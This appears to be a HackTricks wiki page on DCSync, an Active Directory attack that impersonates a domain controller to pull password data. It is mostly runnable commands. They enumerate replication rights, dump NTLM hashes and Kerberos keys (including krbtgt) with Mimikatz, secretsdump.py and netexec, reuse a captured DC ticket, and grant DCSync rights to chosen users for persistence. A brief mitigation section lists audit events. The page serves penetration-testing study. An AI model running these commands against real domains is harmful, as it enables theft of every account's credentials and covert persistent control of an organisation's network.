# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.

**Important Notes about DCSync:**

- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
- In practice, **full DCSync** needs **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** on the domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` is commonly delegated together with them, but on its own it is more relevant for syncing **confidential / RODC-filtered attributes** (for example legacy LAPS-style secrets) than for a full krbtgt dump.
- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text

### Enumeration

Check who has these permissions using `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

If you want to focus on **non-default principals** with DCSync rights, filter out the built-in replication-capable groups and review only unexpected trustees:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit Locally

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit Remotely

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Practical scoped examples:

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync using a captured DC machine TGT (ccache)

In unconstrained-delegation export-mode scenarios, you may capture a Domain Controller machine TGT (e.g., `DC1$@DOMAIN` for `krbtgt@DOMAIN`). You can then use that ccache to authenticate as the DC and perform DCSync without a password.

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operational notes:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. If the environment enforces **SPN target name validation**, a full dump may fail with `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In that case, either request a **`cifs/<dc>`** service ticket for the target DC first or fall back to **`-just-dc-user`** for the account you need immediately.
- When you only have lower replication rights, LDAP/DirSync-style syncing can still expose **confidential** or **RODC-filtered** attributes (for example legacy `ms-Mcs-AdmPwd`) without a full krbtgt replication.

`-just-dc` generates 3 files:

- one with the **NTLM hashes**
- one with the the **Kerberos keys**
- one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux operators can do the same with `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Then, you can **check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
- Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
- Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
